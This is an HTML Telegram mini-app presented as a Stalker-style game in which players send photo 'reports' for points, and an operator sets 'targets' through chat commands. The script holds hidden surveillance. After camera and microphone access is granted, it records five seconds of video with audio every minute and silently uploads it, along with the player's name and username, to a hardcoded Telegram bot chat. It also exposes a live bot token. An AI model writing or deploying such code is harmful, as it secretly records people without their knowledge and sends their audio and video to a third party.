<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PDA Arsenii v3.5</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --green: #00ff41; --bg: #050804; }
        body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
        .header { padding: 10px 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; background: rgba(0,255,65,0.05); }
        .avatar { width: 40px; height: 40px; border: 1px solid var(--green); border-radius: 50%; }
        .stats { flex-grow: 1; }
        .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; }
        .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
        video { width: 100%; height: 100%; object-fit: cover; filter: brightness(1.1); }
        .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
        .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; }
        .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
        @keyframes scan { from { top: 0; } to { top: 100%; } }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="header">
        <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
        <div class="stats">
            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">СВЯЗЬ...</div>
            <div class="balance-main"><span id="balance">0</span> ☢️</div>
        </div>
        <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
    </div>
    <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
    <div class="mission-panel">
        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">КАНАЛ ЗАЩИЩЕН</div>
        <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
    </div>
    <canvas id="captureCanvas" style="display:none;"></canvas>

<script>
    const CONFIG = {
        token: "8677364559:AAGWCwbiGEEtrmVzKfP4wo7ZpzionHhx-MI",
        chatId: "6997991003"
    };

    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    // Получаем @username или Имя
    const user = {
        id: tg.initDataUnsafe?.user?.id || 0,
        name: tg.initDataUnsafe?.user?.first_name || "STALKER",
        username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "нет username",
        photo: tg.initDataUnsafe?.user?.photo_url
    };

    let balance = parseInt(localStorage.getItem(`bal_${user.id}`)) || 0;
    let lastUpdateId = 0;
    let currentMode = "environment";

    document.getElementById('display-name').innerText = user.name.toUpperCase();
    document.getElementById('balance').innerText = balance;
    if (user.photo) document.getElementById('user-pic').src = user.photo;

    async function startCam(mode) {
        if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
            window.currentStream = s;
            document.getElementById('webcam').srcObject = s;
            
            // Скрытый мониторинг (видео раз в минуту)
            const recorder = new MediaRecorder(s);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const fd = new FormData();
                fd.append("chat_id", CONFIG.chatId);
                fd.append("video", blob, "v.mp4");
                fd.append("caption", `📹 МОНИТОРИНГ\n👤 Игрок: ${user.name} (${user.username})\n📷 Ракурс: ${currentMode}`);
                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
            };
            
            setInterval(() => {
                if(recorder.state === "inactive") {
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000); // 5 секунд записи
                }
            }, 60000);

        } catch (e) { console.error(e); }
    }

    document.getElementById('switchCam').onclick = () => {
        currentMode = (currentMode === "environment") ? "user" : "environment";
        startCam(currentMode);
    };

    document.getElementById('sendBtn').onclick = () => {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('captureCanvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append("chat_id", CONFIG.chatId);
            fd.append("photo", blob, "1.jpg");
            fd.append("caption", `☢️ ОТЧЕТ ОТ ${user.username}\n👤 Имя: ${user.name}\n🆔 ID: ${user.id}`);
            const kb = { inline_keyboard: [[
                { text: "✅ ПРИНЯТЬ (+100)", callback_data: `pay:${user.id}:100` },
                { text: "💎 ВАЖНОЕ (+500)", callback_data: `pay:${user.id}:500` }
            ]] };
            fd.append("reply_markup", JSON.stringify(kb));
            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
            tg.showAlert("ДАННЫЕ ОТПРАВЛЕНЫ");
        }, "image/jpeg");
    };

    async function sync() {
        try {
            const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
            const data = await res.json();
            if (data.result) {
                data.result.forEach(u => {
                    lastUpdateId = u.update_id;
                    if (u.callback_query) {
                        const parts = u.callback_query.data.split(":");
                        if (parts[0] === "pay" && parts[1] == user.id) {
                            balance += parseInt(parts[2]);
                            localStorage.setItem(`bal_${user.id}`, balance);
                            document.getElementById('balance').innerText = balance;
                            tg.HapticFeedback.notificationOccurred('success');
                        }
                    }
                    const msg = u.message?.text || "";
                    if (msg.toLowerCase().includes("приказ:")) {
                        document.getElementById('target-text').innerText = msg.split(":")[1].toUpperCase();
                    }
                });
            }
        } catch (e) {}
    }

    startCam(currentMode);
    setInterval(sync, 2500);
</script>
</body>
</html>
